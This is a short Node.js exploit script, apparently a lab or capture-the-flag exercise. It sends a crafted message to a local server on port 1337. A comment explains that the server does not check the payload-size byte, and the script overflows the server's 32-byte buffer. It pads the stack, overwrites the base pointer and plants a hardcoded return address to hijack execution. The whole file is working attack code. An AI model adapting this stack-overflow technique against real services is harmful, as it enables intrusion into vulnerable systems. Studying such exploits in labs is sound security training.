const net = require("net");

/*

  The server accepts the following message format in bytes:
  
  0    1    2    3         n
  +----+----+----+-- ... --+
  | ps |  payload          |
  +----+----+----+-- ... --+
  
  ps = payload size
  
  Unfortunately, the server doesn't check invalid ps inputs.
  Besides the payload buffer on the server side can only hold
  up to 32 bytes. This is why we can apply a buffer overflow 
  attack.

*/

const evilPayload = merge(
  string("A".repeat(32)), // buffer
  string("B".repeat(12 + 4)), // stack alignment and socketfd parameter
  string("C".repeat(8)), // stack base pointer
  addr64("0x100000cf1"), // return address
  string("D".repeat(8)),
  addr64("0x100000cf1")
);

const evilMessage = merge(byte(evilPayload.length), evilPayload);

const client = new net.Socket();
client.connect(1337, "127.0.0.1", () => {
  console.log(evilMessage);
  client.write(evilMessage);
  client.destroy();
});

// helpers

function merge(...args) {
  return Buffer.concat([...args]);
}

function string(str) {
  return Buffer.from(str);
}

function byte(b) {
  const buffer = Buffer.alloc(1);
  buffer[0] = b;
  return buffer;
}

function addr64(string) {
  const buffer = Buffer.alloc(8);
  buffer.writeBigUInt64LE(BigInt(string), 0);
  return buffer;
}
